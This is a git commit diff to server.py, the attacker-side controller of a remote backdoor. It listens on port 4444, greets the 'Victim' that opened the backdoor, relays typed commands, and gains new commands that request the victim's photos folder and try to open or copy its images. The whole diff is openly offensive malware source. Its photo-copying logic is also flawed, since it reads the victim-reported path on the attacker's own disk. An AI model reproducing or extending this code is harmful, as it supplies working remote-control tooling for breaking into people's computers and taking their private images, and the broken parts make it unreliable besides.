6ed463deb498f78ebdc6cf846e06d63e6d5394c6
Dilmer-Rojas <dilmer.rojas@ukuepa.com>
2024-02-21 23:29:11 -0500

    Cambio de IP

--- server.py
+++ server.py
@@ -1,4 +1,7 @@
 import socket
+import subprocess
+import os
+import shutil
 
 Attacker_IP = '10.93.94.171'
 PORT = 4444
@@ -15,9 +18,33 @@ print('Victim opened the backdoor! IP: ' + Victim_IP[0])
 while True:
     command = input('Enter Command : ')
     command = command.encode()
-    Victim.send(command)
-    print('Command sent to ' + Victim_IP[0])
+    if command.decode() == 'open_photos_folder':
+        # Solicitar al cliente la ubicación de la carpeta de fotos
+        Victim.send('send_photos_folder_location'.encode())
+        photos_folder_location = Victim.recv(1024).decode()
+        
+        # Abrir la carpeta de fotos en el sistema operativo Windows
+        os.system('start "" "' + photos_folder_location + '"')
+    elif command.decode().startswith('copy_photos'):
+        # Solicitar al cliente la ubicación de la carpeta de fotos
+        Victim.send('send_photos_folder_location'.encode())
+        photos_folder_location = Victim.recv(1024).decode()
+        
+        destination_folder = command.decode().split(' ')[1]  # Obtener la ruta de destino especificada por el atacante
+        
+        # Verificar si la carpeta de destino existe, si no, crearla
+        if not os.path.exists(destination_folder):
+            os.makedirs(destination_folder)
+        
+        # Copiar todas las fotos de la carpeta de fotos a la carpeta de destino
+        for filename in os.listdir(photos_folder_location):
+            if filename.endswith('.jpg') or filename.endswith('.png'):  # Filtrar solo archivos de imagen
+                shutil.copy(os.path.join(photos_folder_location, filename), destination_folder)
+                print('Copied:', filename)
+    else:
+        Victim.send(command)
+        print('Command sent to ' + Victim_IP[0])
     
-    output = Victim.recv(1024)
-    output = output.decode()
-    print("Output: " + output) 
+        output = Victim.recv(1024)
+        output = output.decode()
+        print("Output: " + output)
